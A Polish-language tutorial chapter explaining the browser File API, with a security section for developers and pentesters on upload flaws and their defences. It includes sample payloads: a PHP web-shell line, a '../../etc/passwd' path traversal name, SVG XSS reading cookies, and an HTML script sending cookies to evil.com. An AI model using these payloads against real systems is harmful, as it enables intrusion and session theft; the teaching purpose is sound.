# Rozdział 27: File API

## 1. Czym jest File API

**File API** to zestaw interfejsów JavaScript umożliwiających dostęp do plików wybranych przez użytkownika (przez `<input type="file">` lub drag-and-drop), bez konieczności przesyłania ich na serwer. Aplikacja może odczytywać zawartość pliku bezpośrednio w przeglądarce.

File API składa się z:
- **`File`** — reprezentacja wybranego pliku (rozszerza `Blob`)
- **`FileList`** — kolekcja `File` objects (z `input.files`)
- **`FileReader`** — asynchroniczne czytanie zawartości pliku
- **`Blob`** — bazowa klasa dla binarnych danych
- **`URL.createObjectURL()`** — tymczasowy URL dla Blob/File
- **File System Access API** — nowsza wersja z pełnym dostępem do systemu plików (Rozdział 27b)

---

## 2. Dlaczego powstał

### Problem: pliki tylko przez serwer

Przed File API jedynym sposobem na pracę z plikiem użytkownika była:
- Prześlij plik na serwer przez `<form enctype="multipart/form-data">`
- Serwer przetwarza i zwraca wynik

File API (2009, W3C) umożliwia:
- Walidację pliku (rozmiar, typ, zawartość) przed przesłaniem
- Podgląd obrazu/wideo lokalnie
- Przetwarzanie CSV/JSON w przeglądarce
- Offline-capable aplikacje (import/eksport przez pliki)

---

## 3. Jak działa

### Dostęp do pliku przez input

```javascript
const input = document.querySelector('input[type="file"]');

input.addEventListener('change', () => {
    const file = input.files[0]; // File object
    
    console.log(file.name);         // "document.pdf"
    console.log(file.size);         // 1048576 (bajty)
    console.log(file.type);         // "application/pdf"
    console.log(file.lastModified); // timestamp
    
    // FileList - multiple files
    const files = Array.from(input.files);
});
```

### Drag and Drop

```javascript
const dropZone = document.getElementById('dropzone');

dropZone.addEventListener('dragover', (e) => {
    e.preventDefault(); // wymagane by drop działał
});

dropZone.addEventListener('drop', (e) => {
    e.preventDefault();
    const files = Array.from(e.dataTransfer.files);
    processFiles(files);
});
```

### FileReader — czytanie zawartości

```javascript
function readFile(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        
        reader.onload = (event) => resolve(event.target.result);
        reader.onerror = (event) => reject(reader.error);
        reader.onprogress = ({ loaded, total }) => {
            const percent = (loaded / total) * 100;
            updateProgressBar(percent);
        };
        
        // Metody czytania:
        reader.readAsText(file, 'UTF-8');        // string
        reader.readAsDataURL(file);              // data:image/png;base64,...
        reader.readAsArrayBuffer(file);          // ArrayBuffer
        reader.readAsBinaryString(file);         // deprecated, używaj ArrayBuffer
    });
}

// Użycie:
const text = await readFile(csvFile);        // CSV → string → parse
const dataUrl = await readFile(imageFile);   // Image → data URL → src
const buffer = await readFile(binaryFile);   // Binary → ArrayBuffer → process
```

### Nowoczesne alternatywy (bez FileReader)

```javascript
// Blob/File mają nowoczesne async metody:
const text = await file.text();         // string
const buffer = await file.arrayBuffer(); // ArrayBuffer
const stream = file.stream();           // ReadableStream

// URL.createObjectURL — tymczasowy URL
const url = URL.createObjectURL(imageFile);
img.src = url; // wyświetl obraz bez uploadu!
URL.revokeObjectURL(url); // zwolnij po użyciu!
```

### Tworzenie Blob i pliku do pobrania

```javascript
// Stwórz plik i udostępnij do pobrania
function downloadJSON(data, filename) {
    const json = JSON.stringify(data, null, 2);
    const blob = new Blob([json], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click(); // triggeruje pobieranie
    
    URL.revokeObjectURL(url); // cleanup
}
```

---

## 4. Co dzieje się wewnętrznie

### File object

`File` jest rozszerzeniem `Blob`. `Blob` to immutable, raw binary data w pamięci (lub reference do pliku na dysku — implementacja-zależna). Przeglądarka może przechowywać duże Blob na dysku, małe w pamięci.

### FileReader i Event Loop

FileReader jest asynchroniczny — czytanie pliku odbywa się w tle (w wątku I/O przeglądarki). Callbacki (`onload`, `onprogress`) są wywoływane przez Event Loop (Macrotask).

### Object URL

`URL.createObjectURL()` tworzy **tymczasowy URL** (`blob:https://origin/uuid`) wskazujący na dane w pamięci przeglądarki. Ten URL:
- Jest ważny tylko w kontekście bieżącego dokumentu/origin
- Nie jest dostępny cross-origin
- Musi być zwolniony przez `revokeObjectURL()` aby uniknąć wycieku pamięci

---

## 5. Analogiczny przykład z życia

File API to skaner dokumentów w biurze:

- Użytkownik kładzie dokument na skanerze (`<input type="file">`)
- Skaner odczytuje zawartość bez wysyłania oryginału do drukarni (serwera)
- Aplikacja dostaje kopię cyfrową do obróbki w biurze (kliencie)
- `URL.createObjectURL` to jak tymczasowy pokój z dokumentem — gość może go zobaczyć, ale link wygasa

---

## 6. Przykład kodu

```javascript
// === Walidator pliku przed uploadem ===
class FileValidator {
    constructor(options) {
        this.maxSize = options.maxSize ?? 10 * 1024 * 1024; // 10 MB default
        this.allowedTypes = options.allowedTypes ?? [];
        this.allowedExtensions = options.allowedExtensions ?? [];
    }
    
    async validate(file) {
        const errors = [];
        
        // 1. Sprawdź rozmiar
        if (file.size > this.maxSize) {
            errors.push(`Plik za duży: ${(file.size / 1024 / 1024).toFixed(1)} MB > ${this.maxSize / 1024 / 1024} MB`);
        }
        
        // 2. Sprawdź MIME type (z pliku, ale może być sfałszowany!)
        if (this.allowedTypes.length && !this.allowedTypes.includes(file.type)) {
            errors.push(`Niedozwolony typ: ${file.type}`);
        }
        
        // 3. Sprawdź rozszerzenie
        const ext = file.name.split('.').pop().toLowerCase();
        if (this.allowedExtensions.length && !this.allowedExtensions.includes(ext)) {
            errors.push(`Niedozwolone rozszerzenie: .${ext}`);
        }
        
        // 4. Sprawdź magic bytes (prawdziwa weryfikacja typu)
        const signature = await this.getMagicBytes(file);
        if (!this.isValidSignature(signature, file.type)) {
            errors.push('Zawartość pliku nie zgadza się z deklarowanym typem');
        }
        
        return { valid: errors.length === 0, errors };
    }
    
    async getMagicBytes(file) {
        const buffer = await file.slice(0, 12).arrayBuffer();
        return new Uint8Array(buffer);
    }
    
    isValidSignature(bytes, mimeType) {
        const signatures = {
            'image/jpeg': [[0xFF, 0xD8, 0xFF]],
            'image/png':  [[0x89, 0x50, 0x4E, 0x47]],
            'image/gif':  [[0x47, 0x49, 0x46]],
            'application/pdf': [[0x25, 0x50, 0x44, 0x46]],
        };
        
        const sigs = signatures[mimeType];
        if (!sigs) return true; // brak known signature = akceptuj
        
        return sigs.some(sig => sig.every((byte, i) => bytes[i] === byte));
    }
}

// Użycie:
const validator = new FileValidator({
    maxSize: 5 * 1024 * 1024, // 5 MB
    allowedTypes: ['image/jpeg', 'image/png', 'application/pdf'],
    allowedExtensions: ['jpg', 'jpeg', 'png', 'pdf']
});

input.addEventListener('change', async () => {
    const { valid, errors } = await validator.validate(input.files[0]);
    if (!valid) showErrors(errors);
});
```

---

## 7. Przykład z prawdziwej aplikacji

### Podatność: Content-Type Spoofing

```javascript
// Serwer sprawdza typ pliku przez Content-Type z request:
// BŁĄD: Content-Type może być sfałszowany przez klienta!

// Klient może wysłać:
const formData = new FormData();
formData.append('file', new Blob([maliciousScript], { type: 'image/png' }), 'avatar.png');
// Content-Type w multipart: image/png ← fałszywe!
// Zawartość: <?php system($_GET['cmd']); ?> ← malicious PHP

// Serwer powinien walidować magic bytes, nie Content-Type!
// Lub używać bezpiecznych plecek (file-type npm library)
```

### Path Traversal przez filename

```javascript
// BEZPIECZNY upload — serwer NIE powinien używać file.name bezpośrednio!
// Podatna implementacja:
app.post('/upload', multer().single('file'), (req, res) => {
    const filename = req.file.originalname; // NIEBEZPIECZNE!
    fs.writeFile(`./uploads/${filename}`, req.file.buffer, callback);
    // Atak: filename = '../../etc/passwd' lub '../app.js'
});

// BEZPIECZNA implementacja:
const { v4: uuid } = require('uuid');
const path = require('path');

app.post('/upload', multer().single('file'), (req, res) => {
    const ext = path.extname(req.file.originalname).toLowerCase();
    const safeFilename = uuid() + ext; // generuj bezpieczną nazwę
    const dest = path.join('./uploads', safeFilename);
    
    // Sprawdź czy dest jest w uploads/ (path traversal prevention)
    if (!dest.startsWith(path.resolve('./uploads'))) {
        return res.status(400).send('Invalid path');
    }
    
    fs.writeFile(dest, req.file.buffer, callback);
});
```

---

## 8. Typowe błędy programistów

### Błąd 1: Ufanie file.type (MIME spoofing)

```javascript
// BŁĄD: file.type pochodzi z nagłówka HTTP lub rozszerzenia — nie z zawartości
if (file.type !== 'image/png') throw new Error('Only PNG allowed');
// Atakujący może zmienić rozszerzenie: malware.exe → malware.png

// POPRAWKA: sprawdzaj magic bytes
const buffer = await file.slice(0, 4).arrayBuffer();
const bytes = new Uint8Array(buffer);
const isPNG = bytes[0] === 0x89 && bytes[1] === 0x50;
```

### Błąd 2: Brak revoke Object URL

```javascript
// BŁĄD: wyciek pamięci
function displayImage(file) {
    const url = URL.createObjectURL(file);
    img.src = url;
    // Nigdy: URL.revokeObjectURL(url) → wyciek!
}

// POPRAWKA:
img.onload = () => URL.revokeObjectURL(img.src);
img.src = URL.createObjectURL(file);
```

### Błąd 3: Renderowanie SVG z FileReader

```javascript
// BŁĄD: SVG może zawierać JavaScript!
const text = await file.text();
div.innerHTML = text; // <svg><script>alert(1)</script></svg> → XSS!

// POPRAWKA: używaj DOMPurify lub Image tag (nie innerHTML)
const url = URL.createObjectURL(file);
img.src = url; // Image tag nie wykonuje JS w SVG
```

---

## 9. Znaczenie dla bezpieczeństwa

### XSS przez SVG upload

SVG jest XML który może zawierać `<script>`. Jeśli aplikacja:
1. Pozwala uploadować SVG
2. Serwuje je z `Content-Type: image/svg+xml`
3. Bezpośrednio linkuje lub inline'uje SVG w HTML

→ Stored XSS:

```xml
<!-- malicious.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
  <text>Niewinny obrazek</text>
</svg>
```

**Obrona:** serwuj SVG z `Content-Type: text/plain` lub `Content-Disposition: attachment` gdy uploadowane przez użytkownika, lub sanityzuj przez DOMPurify.

### HTML Upload → Stored XSS

```html
<!-- malicious.html uploadowany jako "dokument" -->
<html><body>
  <script>document.location='https://evil.com/steal?c='+document.cookie</script>
</body></html>
```

Jeśli serwis hostuje user-uploaded HTML na tym samym origin → Stored XSS.

### PDF z JavaScript

PDF może zawierać JavaScript. Adobe Reader historycznie wykonywał JavaScript w PDF. Nowoczesne przeglądarki (PDF.js) blokują to, ale starsza wersja lub Adobe Acrobat → wektor.

### Powiązane CWE

- **CWE-434** — Unrestricted Upload of File with Dangerous Type
- **CWE-22** — Path Traversal
- **CWE-79** — XSS (SVG, HTML upload)
- **CWE-400** — Resource Exhaustion (ogromny plik → DoS)

---

## 10. Jak identyfikować podczas pentestu

### Testy uploadów

```
1. Upload SVG z XSS payload
2. Upload HTML plik
3. Upload plik z rozszerzeniem .php/.jsp ale zawartością obrazka
4. Upload plik z path traversal w nazwie: ../../index.html
5. Upload bardzo duży plik (DoS)
6. Upload zip bomb (rekurencyjne zip)
7. Upload plik z podwójnym rozszerzeniem: image.png.php
8. Upload MIME-type spoofing: PNG extension, PHP content
```

### DevTools Console

```javascript
// Odczytaj zawartość wybranych plików lokalnie (testowanie walidacji)
document.querySelector('input[type="file"]').addEventListener('change', async (e) => {
    const file = e.target.files[0];
    const buffer = await file.arrayBuffer();
    const bytes = new Uint8Array(buffer.slice(0, 16));
    console.log('Magic bytes:', Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(' '));
    console.log('file.type:', file.type); // porównaj z magic bytes
});
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy aplikacja sprawdza magic bytes (nie tylko MIME type lub rozszerzenie)?
□ Czy możliwy upload SVG lub HTML z XSS payload?
□ Czy uploadowane pliki są serwowane na tym samym origin?
□ Czy path traversal możliwy przez filename?
□ Czy jest limit rozmiaru pliku?
□ Czy zip bomb jest blokowana?
□ Czy podwójne rozszerzenia są obsługiwane bezpiecznie?
□ Czy Object URLs są revokowane po użyciu?
□ Czy serwer sanityzuje oryginalne nazwy plików?
```

---

## 12. Jak się zabezpieczać

```javascript
// Klient (pierwsza linia obrony, nie jedyna!):
const MAX_SIZE = 5 * 1024 * 1024; // 5MB

async function validateBeforeUpload(file) {
    // Rozmiar
    if (file.size > MAX_SIZE) throw new Error('Too large');
    
    // Magic bytes
    const buf = await file.slice(0, 12).arrayBuffer();
    const bytes = new Uint8Array(buf);
    
    const PNG = bytes[0] === 0x89 && bytes[1] === 0x50;
    const JPEG = bytes[0] === 0xFF && bytes[1] === 0xD8;
    
    if (!PNG && !JPEG) throw new Error('Only PNG/JPEG allowed');
    
    return true;
}

// Serwer (ostateczna obrona):
// 1. Waliduj magic bytes na serwerze (file-type library)
// 2. Rename do UUID + safe extension
// 3. Serwuj uploadowane pliki z osobnego origin/subdomain
// 4. Ustaw Content-Disposition: attachment
// 5. Skanuj antywirusem (ClamAV)
```

---

## 13. Podsumowanie

**Kluczowe fakty:**

1. File API = dostęp do plików użytkownika w przeglądarce bez uploadu
2. `file.type` jest niezaufany — można sfałszować; używaj magic bytes
3. `URL.createObjectURL()` wymaga `revokeObjectURL()` — inaczej wyciek
4. SVG i HTML mogą zawierać JavaScript → XSS przez upload
5. Path traversal przez `file.name` na serwerze — zawsze generuj bezpieczną nazwę

**Dla pentestera:**
- Upload SVG z XSS = pierwsze do sprawdzenia
- Sprawdź czy serwer weryfikuje tylko MIME type (łatwy bypass)
- Path traversal w nazwie pliku
- Sprawdź gdzie serwowane są uploadowane pliki (ten sam origin = ryzyko)

---

## Powiązania

```
File API
    │
    ├──► Fetch API (Rozdział 11)
    │         FormData + File → upload przez fetch
    │
    ├──► IndexedDB (Rozdział 17)
    │         File/Blob można przechowywać w IndexedDB
    │
    ├──► Cache API (Rozdział 18)
    │         Response body to Blob
    │
    └──► DOM/XSS (Rozdział 9)
              SVG/HTML upload → Stored XSS przez DOM
```
